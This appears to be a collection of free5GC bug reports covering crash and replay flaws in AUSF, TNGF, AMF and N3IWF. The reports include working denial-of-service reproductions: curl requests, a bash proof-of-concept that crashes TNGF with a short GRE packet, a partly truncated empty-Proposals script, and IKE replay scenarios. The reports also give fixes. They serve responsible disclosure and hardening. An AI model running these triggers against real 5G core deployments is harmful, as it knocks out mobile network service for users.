Docker validation on March 20, 2026 reproduced the crash by obtaining a valid `nausf-auth` token, stopping `NRF`, and then sending a normal authenticated `POST /nausf-auth/v1/ue-authentications`. AUSF returned `500 Internal Server Error`, and Gin recovery logged a nil-pointer panic in `UeAuthPostRequestProcedure`.

Relevant code: `NFs/ausf/internal/sbi/processor/ue_authentication.go:277-280`, `NFs/ausf/internal/sbi/consumer/udm_service.go:91-93`.

## To Reproduce

1. Obtain a valid `nausf-auth` token while `NRF` is still running:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=AMF&nfInstanceId=e00dbbea-2d13-4327-8ec6-23093ed41616&targetNfType=AUSF&scope=nausf-auth'
```

2. Stop `NRF`:

```bash
docker stop nrf
```

3. Send a normal authenticated AUSF authentication request:

```bash
curl -i -X POST 'http://10.100.200.7:8000/nausf-auth/v1/ue-authentications' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_nausf_auth_jwt>' \
  --data '{"supiOrSuci":"suci-0-208-93-0-0-0-0000007487","servingNetworkName":"5G:mnc093.mcc208.3gppnetwork.org"}'
```

4. Observe `500 Internal Server Error` and a nil-pointer panic in `UeAuthPostRequestProcedure`.

5. Recover the lab:

```bash
docker start nrf
docker restart ausf
docker restart amf
docker restart udm
docker restart udr
```

## Expected Behavior

If token acquisition for `nudm-ueau` fails, AUSF should return a controlled `5xx` error instead of dereferencing a nil `ProblemDetails`. Upstream failures should not trigger a panic or stack trace.

## Screenshots

N/A (see log excerpt below).

## Environment

- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`
- Runtime image: `free5gc/ausf:v4.2.1`
- Runtime AUSF commit hash: `a96e1584`
- Validation date: March 20, 2026
- Validation environment: Docker-based lab on the internal SBI network

### Log File

```text

Content-Length: 0
```

```text

2026-03-20T13:19:30.194138732Z [INFO][AUSF][UeAuth] Serving network authorized
```

items.title: [Bugs] TNGF CREATE_CHILD_SA handler panics on empty Proposals array without length check, causing DoS
items.body:
## Bug Decription

A remote, authenticated attacker can crash the `TNGF` process by replying to a production `CREATE_CHILD_SA` request with a `SecurityAssociation` payload whose `Proposals` list is empty. `HandleCREATECHILDSA()` accesses `securityAssociation.Proposals[0].SPI` without verifying that the slice is non-empty, which causes an immediate panic in the live IKE handler path.

Crash site in `tngf/pkg/ike/handler/handler.go`:

```go
outboundSPI := binary.BigEndian.Uint32(
    securityAssociation.Proposals[0].SPI)
```

The handler checks `securityAssociation != nil` but does not check `len(Proposals) > 0`.

## To Reproduce

Steps to reproduce the behavior:

1. Prepare a live free5GC `v4.2.1` trusted non-3GPP access lab with `TNGF`, `UPF`, `amf`, and the required host network setup, and make sure the host has the `gtp5g` kernel module loaded.
2. Run command `test_tngf_create_child_empty_proposals_fatal_dos.sh`.
4. The script builds the live trusted-access driver, completes `RADIUS + IKE + NWtCP + PDU Session`, waits until `TNGF` emits a production `CREATE_CHILD_SA`, and then replies with a `SecurityAssociation` payload whose `Proposals` list is empty.
5. During live Docker validation on `2026-04-04 UTC`, the helper output showed `nas tcp connected`, `observed CREATE_CHILD_SA msgid=0`, and `sent empty-proposals CREATE_CHILD_SA response`, after which `tngf` changed from `status=running running=true restart=0 exit=0` to `status=exited running=false restart=0 exit=1` with `finished=2026-04-04T08:56:13.913017598Z`.

Validated live reproduction command:

```bash
test_tngf_create_child_empty_proposals_fatal_dos.sh
```

PoC script used in live Docker validation:

```bash

set -euo pipefail

REPO_ROOT="/home/ubuntu/free5gc_v421/free5gc"
TEST_ROOT="$REPO_ROOT/test"
BUILD_DIR="/tmp/tngf-live-driver"

  docker stop tngf >/dev/null 2>&1 || true
  docker run --rm --network host --cap-add NET_ADMIN --cap-add NET_RAW --entrypoint sh "$IMAGE_TAG" -lc '
    ip xfrm state flush

      ip link del "$i" 2>/dev/null || true
    done
  ' >/tmp/tngf_cleanup.log 2>&1 || true
}

restore_tngf() {
  cleanup_host_tngf_state
  docker start tngf >/dev/null 2>&1 || true
}

trap restore_tngf EXIT

cd "$REPO_ROOT"

echo "[*] restarting amf"
docker restart amf >/dev/null

echo "[*] building live driver"
mkdir -p "$BUILD_DIR"
(
  cd "$TEST_ROOT"
  GOCACHE=/tmp/go-build GOMODCACHE=/tmp/go-mod-cache go build -o "$BIN_PATH" ./cmd/tngf_live_driver
)
cp "$BIN_PATH" "$BUILD_DIR/"
cat >"$BUILD_DIR/Dockerfile" <<'EOF'

COPY tngf_live_driver /tngf_live_driver

EOF

echo "[*] resetting host TNGF xfrm state and starting tngf"
```

## Expected Behavior

`TNGF` should reject a `CREATE_CHILD_SA` response whose `SecurityAssociation.Proposals` list is empty, return an appropriate IKE error such as `NO_PROPOSAL_CHOSEN`, and never access `Proposals[0]` without checking `len(Proposals) > 0`.

items.title: [Bugs] AMF panics with nil pointer dereference when AUSF omits Links["5g-aka"] from UE Authentication response
items.body:
## Summary

free5gc AMF's `SendAuth5gAkaConfirmRequest` function at `ausf_service.go:116` dereferences `confirmUri.Scheme` without checking whether `confirmUri` is nil. When the AUSF returns a UE Authentication response that omits `Links["5g-aka"]` (or when the Links map is nil/empty), `confirmUri` remains nil while `err` also remains nil, causing the code to enter the else-branch and panic on `confirmUri.Scheme` with a nil pointer dereference.

A malicious or compromised AUSF, or an attacker able to tamper with the N12 SBI response, can strip `Links["5g-aka"]` from the UE Authentication response. When the AMF later processes the UE's Authentication Response, `SendAuth5gAkaConfirmRequest` dereferences a nil `confirmUri`, causing the NGAP worker handling that UE to panic. Each trigger terminates one NGAP worker goroutine; the panic is recovered at the worker level so the AMF process initially survives, but the worker is not automatically restarted. Repeated triggers can progressively exhaust all available NGAP workers. Once all workers have exited, the AMF may become unable to process further NGAP tasks; in a stress test on a 96-core machine, exhausting all 96 workers was followed by AMF shutdown. The worker pool size defaults to `runtime.NumCPU()` (configurable via `ngapWorkerPoolSize`). At the observed rate of ~9 seconds per worker, a 4-worker deployment could exhaust in roughly 40 seconds and an 8-worker deployment in roughly 70–80 seconds, though actual time depends on deployment specifics and worker targeting.

The issue is in `NFs/amf/internal/sbi/consumer/ausf_service.go`, function `SendAuth5gAkaConfirmRequest` (line 104–117). The `SendEapAuthConfirmRequest` function (line 174–180) follows the same code pattern and appears to be affected by the same missing nil-check, though only the 5G-AKA path has been dynamically confirmed in this report.

## Environment

- **free5GC Version**: v4.2.2 (git tag), AMF binary built from commit `8b0f444` (2026-04-21), amfconfig Version 1.0.9
- **OS**: Ubuntu 20.04.6 LTS (Focal Fossa)
- **Kernel version**: 5.4.0-169-generic
- **go version**: go1.25.5 linux/amd64 (AMF binary), go1.26.2 (rebuilt AUSF for PoC)
- **C compiler version**: gcc 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)

## Affected component

- Component: free5gc AMF
- Area: SBI consumer — AUSF authentication confirmation
- Code path: `NFs/amf/internal/sbi/consumer/ausf_service.go`
- Functions: `SendAuth5gAkaConfirmRequest` (line 104–167), `SendEapAuthConfirmRequest` (line 169–226)
- Finding key: `nas5gs.authentication_failure.amf_context.ue_authentication_ctx.links.5g_aka.href.presence`
- Verification status: **dynamically confirmed** — full 5GC PoC reproduces the nil pointer panic in the AMF worker

## Root cause

### SendAuth5gAkaConfirmRequest (line 104–117)

```go
func (s *nausfService) SendAuth5gAkaConfirmRequest(ue *amf_context.AmfUe, resStar string) (
    *models.ConfirmationDataResponse, *models.ProblemDetails, error,
) {
    var ausfUri string
    var confirmUri *url.URL    // ← nil by default
    var err error              // ← nil by default

    // Only assigns confirmUri when Links["5g-aka"] is present and non-empty
    if len(ue.AuthenticationCtx.Links["5g-aka"]) > 0 {
        confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["5g-aka"][0].Href)
    }
    // When Links["5g-aka"] is missing:
    //   - confirmUri stays nil
    //   - err stays nil
    //   - the if-err check below is FALSE
    //   - the else-branch dereferences nil.Scheme → PANIC

    if err != nil {
        return nil, nil, err     // ← err is nil, so we skip this
    } else {
        ausfUri = fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
        //                                  ^^^^^^^^^^^^^^^^
        //                                  nil pointer dereference → PANIC
    }

    client := s.getUEAuthenticationClient(ausfUri)
    // ...
```

The bug has two facets:

1. **Missing Links → nil dereference**: When `Links["5g-aka"]` is absent or has zero length, `confirmUri` stays nil. In Go, accessing `nil_map["key"]` returns the zero value (nil slice), and `len(nil)` returns 0, so neither condition triggers. The code falls through to dereference `confirmUri.Scheme` on nil.

2. **Nil Links map → same outcome**: A nil `Links` map behaves identically — `len(nil_map["5g-aka"])` returns 0, `confirmUri` stays nil, panic follows.

Both conditions were confirmed via unit tests and a full-5GC dynamic PoC.

### SendEapAuthConfirmRequest (line 174–180) — same pattern + additional error handling issue

```go
if len(ue.AuthenticationCtx.Links["eap-session"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["eap-session"][0].Href)
}
if err != nil {
    logger.ConsumerLog.Errorf("url Parse failed: %+v", err)
    // ⚠️ Does NOT return — continues to dereference confirmUri below
}
ausfUri := fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
// Same nil dereference risk. Additionally, if url.Parse fails,
// confirmUri may be nil AND err is non-nil but not returned.
```

This function has the same nil-check pattern and an additional error-handling issue: when `url.Parse` fails, the error is logged but execution continues to the `fmt.Sprintf` line. This path has not been dynamically tested in this report, but static analysis indicates the same nil dereference risk.

## Dynamic verification

### Full 5GC PoC (primary evidence)

The vulnerability was reproduced in a complete free5gc deployment:

1. **AUSF patched**: The AUSF source (`ue_authentication.go:380-383`) was modified to omit `Links["5g-aka"]` from the UE Authentication response — simulating a malicious AUSF.
2. **AUSF rebuilt**: The AUSF binary was rebuilt from the patched source with `go1.26.2`.
3. **Full 5GC started**: NRF, AMF, UDM, patched AUSF, UDR, PCF, NSSF + CoreTesting gNB + state-learner UE.
4. **Registration flow driven**: The UE sent a Registration Request. The AMF forwarded the UE Authentication request to the AUSF. The patched AUSF returned a `201 Created` response **without** `Links["5g-aka"]`. The AMF received the Authentication Response from the UE and called `HandleAuthenticationResponse`, which invoked `SendAuth5gAkaConfirmRequest`.

### AMF log evidence

The AMF log confirms both that the code path was reached and that the nil pointer dereference occurred:

```text
2026-06-30T08:52:33.481203050Z Handle Authentication Response
2026-06-30T08:52:33.481271930Z Worker 1 panic: runtime error: invalid memory address or nil pointer dereference
```

The panic was caught by free5gc's NGAP worker pool recovery mechanism — the AMF process survived, but the worker goroutine handling the UE's NAS message was terminated abnormally.

### AUSF log evidence

The AUSF log confirms the UE Authentication request was processed and a `201` response was returned (without `Links["5g-aka"]`):

```text
2026-06-30T08:52:30.519201273Z Use 5G AKA auth method
2026-06-30T08:52:30.519281414Z | 201 | POST | /nausf-auth/v1/ue-authentications |
```

### Unit test evidence (secondary)

Go unit tests (`nil_pointer_crash_test.go`) directly call `SendAuth5gAkaConfirmRequest` with controlled `AuthenticationCtx.Links` state and recover from the panic. Three conditions tested:

| Test | Condition | Result |
|------|-----------|--------|
| `TestSendAuth5gAkaConfirmRequest_NilPointerPanic` | Links map empty (no `"5g-aka"` key) | PANIC at `ausf_service.go:116` |
| `TestSendAuth5gAkaConfirmRequest_NilLinksMap` | Links map nil | PANIC at `ausf_service.go:116` |
| `TestSendAuth5gAkaConfirmRequest_WithValidLink` | Links map has valid `"5g-aka"` entry | NO panic at line 116 |

### Worker pool exhaustion stress test (DoS confirmation)

A stress test was run to confirm that repeated attacks can exhaust the entire NGAP worker pool. The test repeatedly started a UE, drove the registration → authentication flow (triggering one worker panic per iteration), then killed and restarted the UE.

**Test environment**: 96 logical CPUs → `runtime.NumCPU()` → 96 workers. The stress test used UE identities (AMF-UE-NGAP-IDs RU:1 through RU:96) that mapped across all worker indexes.

| Metric | Value |
|--------|-------|
| Total iterations | 96 |
| Workers exhausted | 96 / 96 (**100%**) |
| Duration | ~14 minutes |
| Rate | ~9.2 seconds per worker |

Observed log sequence after the last worker panicked:

```text
2026-06-30T09:25:33 Worker 95 panic: nil pointer dereference
2026-06-30T09:25:42 Worker 0 panic:  nil pointer dereference   ← last worker
2026-06-30T09:25:50 All workers shut down successfully
2026-06-30T09:25:50 Close SCTP server...
2026-06-30T09:25:50 SCTP server closed
2026-06-30T09:25:50 AMF App is terminated
```

**Note**: The `All workers shut down successfully` / `AMF App is terminated` sequence follows from the AMF's graceful shutdown path (`ShutdownScheduler()`). While the stress test observed shutdown after worker exhaustion, the exact trigger (whether automatic upon all workers exiting, or from an external signal) should be distinguished from the worker-exhaustion condition itself. Regardless of whether shutdown is automatic, once all workers have exited, the scheduler has no live worker to consume tasks from worker channels, and the AMF can no longer process NGAP messages.

**Key observation**: Workers are consumed linearly with no protection — no panic threshold, no automatic worker replenishment, no circuit breaker. Each worker's `run()` loop uses `defer recover()` to catch panics and call `wg.Done()`, but does not restart the worker.

## Expected behavior

When the AMF receives an AUSF UE Authentication response, it should validate that `Links["5g-aka"]` (or `Links["eap-session"]`) is present **before** attempting to use its href value. If the link is missing:

1. `SendAuth5gAkaConfirmRequest` should return an error indicating that the AUSF response is malformed.
2. The AMF should handle this error gracefully — rejecting the authentication for that UE without panicking and without terminating the worker goroutine.

The AMF should not dereference a nil pointer recovered from an external NF's SBI response.

## Actual behavior

When the AUSF returns a UE Authentication response without `Links["5g-aka"]`:

1. `len(ue.AuthenticationCtx.Links["5g-aka"])` returns 0.
2. `confirmUri` remains nil, `err` remains nil.
3. The `if err != nil` check is false.
4. The else-branch executes `confirmUri.Scheme` → nil pointer dereference.
5. The NGAP worker goroutine panics. free5gc's worker pool catches the panic (the AMF process survives), but the worker terminates and the UE's authentication fails abnormally.

## Security impact

A malicious or compromised AUSF, or an attacker able to tamper with the AMF–AUSF SBI response, can omit `Links["5g-aka"]` from the UE Authentication response. When the AMF later processes the UE's Authentication Response, `SendAuth5gAkaConfirmRequest` dereferences a nil `confirmUri`, causing the NGAP worker handling that UE to panic.

Each successful trigger terminates one NGAP worker goroutine. The worker's panic is recovered at the worker level, so the AMF process may initially survive, but the worker is not automatically restarted. Repeated triggers can progressively reduce the available NGAP worker pool capacity. Once all workers have exited, the AMF may become unable to process further NGAP tasks; in the stress test, exhausting all 96 workers was followed by AMF shutdown.

Potential impacts:

- **Progressive NGAP worker exhaustion**: Each trigger terminates one worker with no automatic replenishment. The worker pool size defaults to `runtime.NumCPU()` (configurable via `ngapWorkerPoolSize`). At the observed rate of ~9 seconds per worker, a 4-worker deployment could be fully exhausted in roughly 40 seconds and an 8-worker deployment in roughly 70–80 seconds. Actual time depends on deployment specifics, UE restart speed, and whether the attacker can reliably target distinct worker indexes.
- **No protection mechanisms**: The worker pool has no panic threshold, no automatic worker replenishment, and no circuit breaker. Workers exit silently after `defer recover()` catches the panic, with no defensive response from the scheduler.
- **UE authentication disruption**: Each worker panic silently drops the affected UE's NAS connection. The UE receives no Reject message — the connection hangs until a timeout.
- **AMF service unavailability after exhaustion**: Once all workers have exited, no live goroutine remains to consume tasks from worker channels. New NGAP messages (InitialUEMessage, UplinkNASTransport, etc.) can no longer be processed, making the AMF effectively unavailable. In the stress test, the AMF entered shutdown after all workers were exhausted; whether shutdown is automatically triggered by worker exhaustion or requires an additional signal should be verified independently.
- **EAP-AKA' path appears similarly affected**: `SendEapAuthConfirmRequest` follows the same code pattern (missing nil-check, `url.Parse` errors logged but not returned), though only the 5G-AKA path has been dynamically confirmed in this report.
- **Compromised NF blast radius**: A single compromised AUSF should not be able to trigger worker panics that progressively disable the AMF. This missing input validation weakens the NF-to-NF resilience boundary.

This issue does not require a modified UE. It is an SBI-level defense-in-depth issue, but it does require either a malicious or compromised AUSF, or the ability to tamper with the AMF–AUSF SBI response.

## Suggested fix

### 1. Add nil check for confirmUri

```go
// In SendAuth5gAkaConfirmRequest, after the Links check and before using confirmUri:
if len(ue.AuthenticationCtx.Links["5g-aka"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["5g-aka"][0].Href)
}
if err != nil {
    return nil, nil, err
}
// NEW: guard against missing Links
if confirmUri == nil {
    return nil, nil, fmt.Errorf(
        "missing Links[\"5g-aka\"] in AUSF UE Authentication response")
}
ausfUri = fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
```

### 2. Fix SendEapAuthConfirmRequest

Apply the same nil check, and additionally fix the error handling so that a `url.Parse` failure causes an early return:

```go
if len(ue.AuthenticationCtx.Links["eap-session"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["eap-session"][0].Href)
}
if err != nil {
    // Fixed: return the error instead of just logging it
    return nil, nil, fmt.Errorf("url.Parse failed for eap-session href: %w", err)
}
if confirmUri == nil {
    return nil, nil, fmt.Errorf(
        "missing Links[\"eap-session\"] in AUSF UE Authentication response")
}
ausfUri := fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
```

### 3. Additional hardening

- Add regression tests:
  - `TestSendAuth5gAkaConfirm_RejectsMissingLinks` — empty Links map → expect error, not panic.
  - `TestSendAuth5gAkaConfirm_RejectsNilLinks` — nil Links map → expect error, not panic.
  - Same for `TestSendEapAuthConfirm_*`.
- Consider validating the entire AUSF UE Authentication response before storing it in the UE context, rejecting malformed responses at the point of ingestion rather than at the point of use.

items.title: [Bugs] TNGF GRE Unmarshal performs zero bounds checking on input buffer, Fatalf kills entire process, causing DoS
items.body:
## Bug Decription

A remote, authenticated attacker can crash the `TNGF` process by sending a short GRE packet with length smaller than 4 bytes through the live NWt user-plane IPsec tunnel. `GREPacket.Unmarshal()` performs no bounds checking before reading `b[0]`, `b[1]`, and `b[2:4]`. The NWtUP recovery handler converts the panic into `Fatalf`, which terminates the entire `TNGF` process with `os.Exit(1)`.

Crash site in `tngf/internal/gre/message.go`:

```go
func (p *GREPacket) Unmarshal(b []byte) error {
    p.flags = b[0]
    p.version = b[1]
    p.protocolType = binary.BigEndian.Uint16(b[2:4])
    if p.GetKeyFlag() {
        p.key = binary.BigEndian.Uint32(b[offset:offset+4])
    }
}
```

Fatal recovery path reaches `tngf/internal/nwtup/service/service.go` and exits the process after the panic.

## To Reproduce

Steps to reproduce the behavior:

1. Prepare a live free5GC `v4.2.1` trusted non-3GPP access lab with `TNGF`, `UPF`, `amf`, and the required host network setup, and make sure the host has the `gtp5g` kernel module loaded.
2. Run command `test_tngf_nwtup_short_gre_fatal_dos.sh`.
3. The script builds the live trusted-access driver, completes `RADIUS + IKE + NWtCP + CREATE_CHILD_SA`, sends a valid `CREATE_CHILD_SA` response so the production code installs user-plane state, and then sends a 2-byte GRE payload `0x20 0x00` to the TNGF inner address.
4. During live Docker validation on `2026-04-04 UTC`, the helper output showed `nas tcp connected`, `observed CREATE_CHILD_SA msgid=0`, `sent valid CREATE_CHILD_SA response via rcp119`, and `sent short GRE`, after which `tngf` changed from `status=running running=true restart=0 exit=0` to `status=exited running=false restart=0 exit=1` with `finished=2026-04-04T09:09:00.279440394Z`.

Validated live reproduction command:

```bash
test_tngf_nwtup_short_gre_fatal_dos.sh
```

PoC script used in live Docker validation:

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="/home/ubuntu/free5gc_v421/free5gc"
TEST_ROOT="$REPO_ROOT/test"
BUILD_DIR="/tmp/tngf-live-driver"
IMAGE_TAG="tngf-live-driver:latest"
RUN_NAME="tngf-live-short-gre-host"
BIN_PATH="$TEST_ROOT/tngf_live_driver"

cleanup_host_tngf_state() {
  docker stop tngf >/dev/null 2>&1 || true
  docker run --rm --network host --cap-add NET_ADMIN --cap-add NET_RAW --entrypoint sh "$IMAGE_TAG" -lc '
    ip xfrm state flush
    ip xfrm policy flush
    for i in $(ip -o link show type xfrm | awk -F": " "{print \$2}" | cut -d@ -f1); do
      ip link del "$i" 2>/dev/null || true
    done
  ' >/tmp/tngf_cleanup.log 2>&1 || true
}

restore_tngf() {
  cleanup_host_tngf_state
  docker start tngf >/dev/null 2>&1 || true
}

trap restore_tngf EXIT

cd "$REPO_ROOT"

echo "[*] restarting amf"
docker restart amf >/dev/null

echo "[*] building live driver"
mkdir -p "$BUILD_DIR"
(
  cd "$TEST_ROOT"
  GOCACHE=/tmp/go-build GOMODCACHE=/tmp/go-mod-cache go build -o "$BIN_PATH" ./cmd/tngf_live_driver
)
cp "$BIN_PATH" "$BUILD_DIR/"
cat >"$BUILD_DIR/Dockerfile" <<'EOF'
FROM free5gc/n3iwue:latest
COPY tngf_live_driver /tngf_live_driver
ENTRYPOINT ["/tngf_live_driver"]
EOF

echo "[*] building helper image"
docker build --no-cache -t "$IMAGE_TAG" "$BUILD_DIR" >/tmp/tngf_live_driver_build.log

echo "[*] resetting host TNGF xfrm state and starting tngf"
cleanup_host_tngf_state
docker start tngf >/dev/null
sleep 3

echo "[*] status before trigger"
docker inspect tngf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

start_ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[*] trigger timestamp: $start_ts"

echo "[*] running short-GRE PoC"
docker rm -f "$RUN_NAME" >/dev/null 2>&1 || true
docker run --rm --name "$RUN_NAME" --network host --cap-add NET_ADMIN --cap-add NET_RAW \
  -e PUBLIC_IFACE=br-free5gc \
  -e TNGF_PUBLIC_IP=10.0.0.17 \
  -e LOCAL_CP=1 \
  "$IMAGE_TAG" short-gre

sleep 1

echo "[*] status after trigger"
docker inspect tngf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

echo "[*] recent tngf logs"
docker logs --since "$start_ts" --tail 200 tngf 2>&1

echo "[*] restoring tngf"
restore_tngf
docker inspect tngf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'
```

## Expected Behavior

`TNGF` should validate that the GRE buffer length is at least 4 bytes before reading `b[0]`, `b[1]`, and `b[2:4]`, and at least 8 bytes before reading the key field when the GRE key flag is set. The NWtUP recovery path should log a non-fatal error instead of terminating the process.

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- runtime TNGF build: `commit hash 75cd114c`, `go1.25.5 linux/amd64`
- Requires: `gtp5g` kernel module

### Log File

```text

2026-04-04T09:09:00.276201137Z [FATA][TNGF][NWtUP] panic: runtime error: slice bounds out of range [:4] with capacity 2
goroutine 45 [running]:
runtime/debug.Stack()
    /usr/local/go/src/runtime/debug/stack.go:26 +0x5e
github.com/free5gc/tngf/internal/nwtup/service.forward.func1()

github.com/free5gc/tngf/internal/gre.(*GREPacket).Unmarshal(...)
    /go/src/free5gc/NFs/tngf/internal/gre/message.go:40
github.com/free5gc/tngf/internal/nwtup/service.forward({0xc0004578c0?, 0xc0002dbe60?}, 0x61, {0xc000457888, 0x2, 0x2})

created by github.com/free5gc/tngf/internal/nwtup/service.listenAndServe in goroutine 13
```

items.title: [Bugs] N3IWF: IKE Message ID not validated, allowing replay of DELETE/CREATE_CHILD_SA messages
items.body:
## Bug Description

The N3IWF does not validate IKE Message IDs as required by RFC 7296 Section 2.2. The `Dispatch()` function in `NFs/n3iwf/internal/ike/dispatcher.go` routes incoming IKE messages to handlers based solely on `ExchangeType` without any Message ID verification. Individual handlers then blindly assign the received Message ID to the IKE SA context without checking it against expected values.

This allows an attacker to **replay captured IKE messages** (which retain valid encryption and integrity) and have them processed as legitimate new requests.

**Vulnerability site 1** — `NFs/n3iwf/internal/ike/dispatcher.go` lines 12–38:
```go
func (s *Server) Dispatch(
    udpConn *net.UDPConn,
    localAddr, remoteAddr *net.UDPAddr,
    ikeMessage *ike_message.IKEMessage, msg []byte,
    ikeSA *n3iwf_context.IKESecurityAssociation,
) {
    switch ikeMessage.ExchangeType {
    case ike_message.IKE_SA_INIT:
        s.HandleIKESAINIT(udpConn, localAddr, remoteAddr, ikeMessage, msg)
    case ike_message.IKE_AUTH:
        s.HandleIKEAUTH(udpConn, localAddr, remoteAddr, ikeMessage, ikeSA)
    case ike_message.CREATE_CHILD_SA:
        s.HandleCREATECHILDSA(udpConn, localAddr, remoteAddr, ikeMessage, ikeSA)
    case ike_message.INFORMATIONAL:
        s.HandleInformational(udpConn, localAddr, remoteAddr, ikeMessage, ikeSA)
    }
    // ❌ No Message ID validation before dispatching
}
```

**Vulnerability site 2** — `NFs/n3iwf/internal/ike/handler.go` line 156 (IKE_SA_INIT):
```go
ikeSecurityAssociation.InitiatorMessageID = message.MessageID
// ❌ Directly assigned, no validation
```

**Vulnerability site 3** — `NFs/n3iwf/internal/ike/handler.go` line 293 (IKE_AUTH):
```go
ikeSecurityAssociation.InitiatorMessageID = message.MessageID
// ❌ Directly assigned, should verify MessageID == expected next value
```

**Vulnerability site 4** — `NFs/n3iwf/internal/ike/handler.go` lines 1157–1162 (INFORMATIONAL):
```go
if message.IsResponse() {
    ikeSecurityAssociation.ResponderMessageID++
    // ❌ Does not verify response MessageID matches the request we sent
} else {
    SendUEInformationExchange(ikeSecurityAssociation, ikeSecurityAssociation.IKESAKey,
        responseIKEPayload, false, true, message.MessageID,
        udpConn, ueAddr, n3iwfAddr)
}
```

**IKE SA context** — `NFs/n3iwf/internal/context/ikeue.go` lines 57–59:
```go
// Message ID
InitiatorMessageID uint32
ResponderMessageID uint32
// These are stored but never validated against incoming messages
```

Per RFC 7296 Section 2.2:
- Request Message IDs MUST be sequential (each new request increments by 1)
- Response Message IDs MUST match the corresponding request
- Duplicate requests MUST be detected and the previous response retransmitted (not reprocessed)

## To Reproduce
**Step 1**: Restart N3IWF and trigger a UE connection:

```bash
docker restart n3iwf && sleep 5
docker exec -d n3iwue bash -c "cd /n3iwue && ./n3iwue-postauth -c postauth-config.yaml > /tmp/postauth.log 2>&1"
sleep 15
```

**Step 2**: Observe N3IWF logs showing repeated processing of the same IKE_AUTH Message ID:

```bash
docker logs n3iwf --tail 30 2>&1
```

**Step 3**: The logs show N3IWF processes multiple IKE_AUTH messages with the **same** EAP5G MessageID without rejecting duplicates:

```
[INFO][N3IWF][IKE] Handle IKE_AUTH
[INFO][N3IWF][IKE] EAP5G MessageID : 2
[INFO][N3IWF][NGAP] Send Initial UE Message
[INFO][N3IWF][IKE] Handle IKE_AUTH          ← same message replayed
[INFO][N3IWF][IKE] EAP5G MessageID : 2      ← same MessageID, processed again
[INFO][N3IWF][NGAP] Send Uplink NAS Transport  ← duplicate NAS forwarded
[INFO][N3IWF][IKE] Handle IKE_AUTH          ← replayed again
[INFO][N3IWF][IKE] EAP5G MessageID : 2      ← still no rejection
[INFO][N3IWF][NGAP] Send Uplink NAS Transport  ← another duplicate
[INFO][N3IWF][IKE] Handle IKE_AUTH          ← 4th time
[INFO][N3IWF][IKE] EAP5G MessageID : 2      ← still processed
[INFO][N3IWF][NGAP] Send Uplink NAS Transport  ← duplicate again
```

Each retransmission is treated as a new message. A conformant implementation would detect the duplicate Message ID and either silently drop or retransmit the cached response.

**Step 4**: Source code verification:

```bash
# No Message ID validation in dispatcher
grep -n "MessageID" NFs/n3iwf/internal/ike/dispatcher.go
# No results

# Handler blindly assigns MessageID
grep -n "MessageID" NFs/n3iwf/internal/ike/handler.go
# Shows only assignment lines, no comparison/validation
```

## Security Impact

1. **Tunnel teardown via DELETE replay (Critical)** — Capture an IKE INFORMATIONAL(DELETE) message, replay it later to tear down active IPsec tunnels. N3IWF will process the DELETE without checking if the Message ID is expected.

2. **Resource exhaustion via CREATE_CHILD_SA replay (High)** — Replay captured CREATE_CHILD_SA requests to force N3IWF to perform expensive DH computations, allocate SPI/XFRM resources, and exhaust kernel XFRM state table.

3. **State machine corruption via IKE_AUTH replay (High)** — Replay old IKE_AUTH messages to reset the IKE SA state machine, overwrite negotiated security parameters, and disrupt ongoing authentication.

4. **Duplicate NAS signaling (High)** — As shown in live logs, each replayed IKE_AUTH triggers a new "Send Uplink NAS Transport" to AMF, injecting duplicate NAS messages into the core network.

5. **Combined with ESP replay-window 0 (Critical)** — Together with the ESP replay protection being disabled (see bug-report-19), an attacker can persistently disrupt any UE's non-3GPP connection by alternating IKE DELETE replays with ESP floods.

## Expected Behavior

The N3IWF should validate IKE Message IDs in the `Dispatch()` function before routing to handlers, per RFC 7296 Section 2.2:

```go
func (s *Server) Dispatch(..., ikeMessage *ike_message.IKEMessage, ..., ikeSA *n3iwf_context.IKESecurityAssociation) {
    if ikeSA != nil {
        if !ikeMessage.IsResponse() {
            // Request: MessageID must equal the next expected value
            if ikeMessage.MessageID != ikeSA.InitiatorMessageID {
                ikeLog.Warnf("Unexpected request MessageID: got %d, expected %d",
                    ikeMessage.MessageID, ikeSA.InitiatorMessageID)
                return // Drop
            }
        } else {
            // Response: MessageID must match the request we sent
            if ikeMessage.MessageID != ikeSA.ResponderMessageID {
                ikeLog.Warnf("Unexpected response MessageID: got %d, expected %d",
                    ikeMessage.MessageID, ikeSA.ResponderMessageID)
                return // Drop
            }
        }
    }
    // ... dispatch to handlers
}
```

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- Docker image: `free5gc/n3iwf:v4.2.1`

## Log File

**Live Docker log** (2026-04-04, N3IWF container):
```
2026-04-04T16:41:24Z [INFO][N3IWF][IKE] Handle IKE_SA_INIT
2026-04-04T16:41:24Z [INFO][N3IWF][IKE] Handle IKE_AUTH
